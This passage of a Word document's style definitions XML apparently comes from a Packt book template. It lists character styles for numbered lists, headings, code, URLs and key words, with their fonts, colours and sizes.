    <w:name w:val="WW8Num32z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num32z4">
    <w:name w:val="WW8Num32z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num32z5">
    <w:name w:val="WW8Num32z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num32z6">
    <w:name w:val="WW8Num32z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num32z7">
    <w:name w:val="WW8Num32z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num32z8">
    <w:name w:val="WW8Num32z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num33z0">
    <w:name w:val="WW8Num33z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num33z1">
    <w:name w:val="WW8Num33z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num33z2">
    <w:name w:val="WW8Num33z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num33z3">
    <w:name w:val="WW8Num33z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num33z4">
    <w:name w:val="WW8Num33z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num33z5">
    <w:name w:val="WW8Num33z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num33z6">
    <w:name w:val="WW8Num33z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num33z7">
    <w:name w:val="WW8Num33z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num33z8">
    <w:name w:val="WW8Num33z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num34z0">
    <w:name w:val="WW8Num34z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num34z1">
    <w:name w:val="WW8Num34z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num34z2">
    <w:name w:val="WW8Num34z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num34z3">
    <w:name w:val="WW8Num34z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num34z4">
    <w:name w:val="WW8Num34z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num34z5">
    <w:name w:val="WW8Num34z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num34z6">
    <w:name w:val="WW8Num34z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num34z7">
    <w:name w:val="WW8Num34z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num34z8">
    <w:name w:val="WW8Num34z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num35z0">
    <w:name w:val="WW8Num35z0"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:color w:val="000000"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num36z0">
    <w:name w:val="WW8Num36z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num36z1">
    <w:name w:val="WW8Num36z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num36z2">
    <w:name w:val="WW8Num36z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num36z3">
    <w:name w:val="WW8Num36z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num36z4">
    <w:name w:val="WW8Num36z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num36z5">
    <w:name w:val="WW8Num36z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num36z6">
    <w:name w:val="WW8Num36z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num36z7">
    <w:name w:val="WW8Num36z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num36z8">
    <w:name w:val="WW8Num36z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num37z0">
    <w:name w:val="WW8Num37z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num37z1">
    <w:name w:val="WW8Num37z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num37z2">
    <w:name w:val="WW8Num37z2"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:b w:val="0"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num37z3">
    <w:name w:val="WW8Num37z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num37z4">
    <w:name w:val="WW8Num37z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num37z5">
    <w:name w:val="WW8Num37z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num37z6">
    <w:name w:val="WW8Num37z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num37z7">
    <w:name w:val="WW8Num37z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num37z8">
    <w:name w:val="WW8Num37z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num38z0">
    <w:name w:val="WW8Num38z0"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      <w:color w:val="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num38z1">
    <w:name w:val="WW8Num38z1"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num38z2">
    <w:name w:val="WW8Num38z2"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:cs="Wingdings"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num38z3">
    <w:name w:val="WW8Num38z3"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num39z0">
    <w:name w:val="WW8Num39z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num39z1">
    <w:name w:val="WW8Num39z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num39z2">
    <w:name w:val="WW8Num39z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num39z3">
    <w:name w:val="WW8Num39z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num39z4">
    <w:name w:val="WW8Num39z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num39z5">
    <w:name w:val="WW8Num39z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num39z6">
    <w:name w:val="WW8Num39z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num39z7">
    <w:name w:val="WW8Num39z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num39z8">
    <w:name w:val="WW8Num39z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num40z0">
    <w:name w:val="WW8Num40z0"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num40z1">
    <w:name w:val="WW8Num40z1"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num40z2">
    <w:name w:val="WW8Num40z2"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:cs="Wingdings"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num40z3">
    <w:name w:val="WW8Num40z3"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num41z0">
    <w:name w:val="WW8Num41z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num41z1">
    <w:name w:val="WW8Num41z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num41z2">
    <w:name w:val="WW8Num41z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num41z3">
    <w:name w:val="WW8Num41z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num41z4">
    <w:name w:val="WW8Num41z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num41z5">
    <w:name w:val="WW8Num41z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num41z6">
    <w:name w:val="WW8Num41z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num41z7">
    <w:name w:val="WW8Num41z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num41z8">
    <w:name w:val="WW8Num41z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num42z0">
    <w:name w:val="WW8Num42z0"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num42z1">
    <w:name w:val="WW8Num42z1"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num42z2">
    <w:name w:val="WW8Num42z2"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:cs="Wingdings"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num43z0">
    <w:name w:val="WW8Num43z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num43z1">
    <w:name w:val="WW8Num43z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num43z2">
    <w:name w:val="WW8Num43z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num43z3">
    <w:name w:val="WW8Num43z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num43z4">
    <w:name w:val="WW8Num43z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num43z5">
    <w:name w:val="WW8Num43z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num43z6">
    <w:name w:val="WW8Num43z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num43z7">
    <w:name w:val="WW8Num43z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num43z8">
    <w:name w:val="WW8Num43z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num44z0">
    <w:name w:val="WW8Num44z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num44z1">
    <w:name w:val="WW8Num44z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num44z2">
    <w:name w:val="WW8Num44z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num44z3">
    <w:name w:val="WW8Num44z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num44z4">
    <w:name w:val="WW8Num44z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num44z5">
    <w:name w:val="WW8Num44z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num44z6">
    <w:name w:val="WW8Num44z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num44z7">
    <w:name w:val="WW8Num44z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num44z8">
    <w:name w:val="WW8Num44z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num45z0">
    <w:name w:val="WW8Num45z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num45z1">
    <w:name w:val="WW8Num45z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num45z2">
    <w:name w:val="WW8Num45z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num45z3">
    <w:name w:val="WW8Num45z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num45z4">
    <w:name w:val="WW8Num45z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num45z5">
    <w:name w:val="WW8Num45z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num45z6">
    <w:name w:val="WW8Num45z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num45z7">
    <w:name w:val="WW8Num45z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num45z8">
    <w:name w:val="WW8Num45z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num46z0">
    <w:name w:val="WW8Num46z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num46z1">
    <w:name w:val="WW8Num46z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num46z2">
    <w:name w:val="WW8Num46z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num46z3">
    <w:name w:val="WW8Num46z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num46z4">
    <w:name w:val="WW8Num46z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num46z5">
    <w:name w:val="WW8Num46z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num46z6">
    <w:name w:val="WW8Num46z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num46z7">
    <w:name w:val="WW8Num46z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num46z8">
    <w:name w:val="WW8Num46z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num47z0">
    <w:name w:val="WW8Num47z0"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8NumSt50z1">
    <w:name w:val="WW8NumSt50z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8NumSt50z2">
    <w:name w:val="WW8NumSt50z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8NumSt50z3">
    <w:name w:val="WW8NumSt50z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8NumSt50z4">
    <w:name w:val="WW8NumSt50z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8NumSt50z5">
    <w:name w:val="WW8NumSt50z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8NumSt50z6">
    <w:name w:val="WW8NumSt50z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8NumSt50z7">
    <w:name w:val="WW8NumSt50z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8NumSt50z8">
    <w:name w:val="WW8NumSt50z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading1Char">
    <w:name w:val="Heading 1 Char"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:iCs/>
      <w:color w:val="FFFFFF"/>
      <w:kern w:val="1"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="32"/>
      <w:shd w:val="clear" w:color="auto" w:fill="365F91"/>
      <w:lang w:val="en-GB" w:bidi="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading2Char">
    <w:name w:val="Heading 2 Char"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:iCs/>
      <w:color w:val="365F91"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
      <w:lang w:val="en-GB" w:bidi="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="NormalPACKTChar">
    <w:name w:val="Normal [PACKT] Char"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="en-US" w:bidi="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="CommentReference">
    <w:name w:val="annotation reference"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CommentTextChar">
    <w:name w:val="Comment Text Char"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:val="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="BalloonTextChar">
    <w:name w:val="Balloon Text Char"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:eastAsia="Times New Roman" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:bCs/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="FooterChar">
    <w:name w:val="Footer Char"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
      <w:bCs/>
      <w:sz w:val="20"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Hyperlink">
    <w:name w:val="Hyperlink"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:color w:val="0000FF"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="HTMLPreformattedChar">
    <w:name w:val="HTML Preformatted Char"/>
    <w:rsid w:val="00F83C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rsid w:val="00F83C8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rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:iCs/>
      <w:color w:val="000000"/>
      <w:sz w:val="26"/>
      <w:szCs w:val="26"/>
      <w:lang w:val="en-GB" w:bidi="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading4Char">
    <w:name w:val="Heading 4 Char"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:iCs/>
      <w:color w:val="000000"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="28"/>
      <w:lang w:val="en-GB" w:bidi="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading5Char">
    <w:name w:val="Heading 5 Char"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:color w:val="000000"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="26"/>
      <w:lang w:val="en-GB" w:bidi="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading6Char">
    <w:name w:val="Heading 6 Char"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
      <w:iCs/>
      <w:color w:val="365F91"/>
      <w:sz w:val="20"/>
      <w:lang w:val="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="EmailPACKT">
    <w:name w:val="Email [PACKT]"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console" w:cs="Lucida Console"/>
      <w:color w:val="FF6600"/>
      <w:sz w:val="19"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="URLPACKT">
    <w:name w:val="URL [PACKT]"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console" w:cs="Lucida Console"/>
      <w:color w:val="0000FF"/>
      <w:sz w:val="19"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CodeInTextPACKT">
    <w:name w:val="Code In Text [PACKT]"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console" w:cs="Lucida Console"/>
      <w:color w:val="747959"/>
      <w:sz w:val="19"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="ScreenTextPACKT">
    <w:name w:val="Screen Text [PACKT]"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
      <w:b/>
      <w:color w:val="008000"/>
      <w:sz w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="KeyWordPACKT">
    <w:name w:val="Key Word [PACKT]"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:b/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="KeyPACKT">
    <w:name w:val="Key [PACKT]"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:i/>
      <w:color w:val="00CCFF"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="ChapterrefPACKT">
    <w:name w:val="Chapterref [PACKT]"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
      <w:i/>
      <w:strike w:val="0"/>
      <w:dstrike w:val="0"/>
      <w:color w:val="808000"/>
      <w:position w:val="0"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
      <w:u w:val="none"/>
      <w:vertAlign w:val="baseline"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="ItalicsPACKT">
    <w:name w:val="Italics [PACKT]"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:i/>
      <w:color w:val="FF99CC"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CodeHighlightedPACKT">
    <w:name w:val="Code Highlighted [PACKT]"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
